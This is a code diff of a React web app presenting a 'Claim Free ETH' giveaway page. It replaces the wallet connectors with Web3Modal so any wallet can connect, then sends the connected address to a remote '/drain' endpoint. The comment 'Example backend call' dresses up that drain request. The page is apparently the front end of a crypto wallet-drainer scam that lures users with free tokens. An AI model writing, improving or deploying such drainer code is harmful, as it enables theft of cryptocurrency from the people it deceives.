@@ -5,22 +5,17 @@ import { WagmiConfig, createConfig, configureChains, useAccount } from "wagmi";
 import { mainnet, sepolia } from "@wagmi/chains";
 import { publicProvider } from "viem/providers/public";
 
-import { InjectedConnector } from "wagmi/connectors/injected";
-import { WalletConnectConnector } from "wagmi/connectors/walletConnect";
-
 import { Web3Modal, useWeb3Modal } from "@web3modal/wagmi";
 
+// Replace with your Web3Modal Project ID
 const projectId = "962425907914a3e80a7d8e7288b23f62";
 
 // Configure chains + providers
 const { chains, publicClient } = configureChains([mainnet, sepolia], [publicProvider()]);
 
-const config = createConfig({
+// Wagmi config (no connectors needed when using Web3Modal Wagmi)
+const wagmiConfig = createConfig({
   autoConnect: true,
-  connectors: [
-    new InjectedConnector({ chains }),
-    new WalletConnectConnector({ chains, options: { projectId } }),
-  ],
   publicClient,
 });
 
@@ -28,7 +23,7 @@ const App = () => {
   const [loading, setLoading] = useState(false);
   const [response, setResponse] = useState(null);
 
-  const { open } = useWeb3Modal();
+  const { open } = useWeb3Modal(); // Opens wallet modal
   const { address, isConnected } = useAccount();
 
   const connectWallet = async () => {
@@ -36,11 +31,13 @@ const App = () => {
       setLoading(true);
       setResponse(null);
 
+      // Open Web3Modal (all wallet options included)
       const connection = await open();
       const walletAddress = connection?.accounts?.[0];
 
       if (!walletAddress) throw new Error("No wallet connected");
 
+      // Example backend call
       const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -66,7 +63,7 @@ const App = () => {
   };
 
   return (
-    <WagmiConfig config={config}>
+    <WagmiConfig config={wagmiConfig}>
       <div className="min-h-screen flex items-center justify-center bg-gray-900 text-white font-sans">
         <div className="bg-gray-800 p-8 rounded-xl shadow-lg w-full max-w-md text-center">
           <h1 className="text-2xl font-bold mb-4">Claim Free ETH</h1>
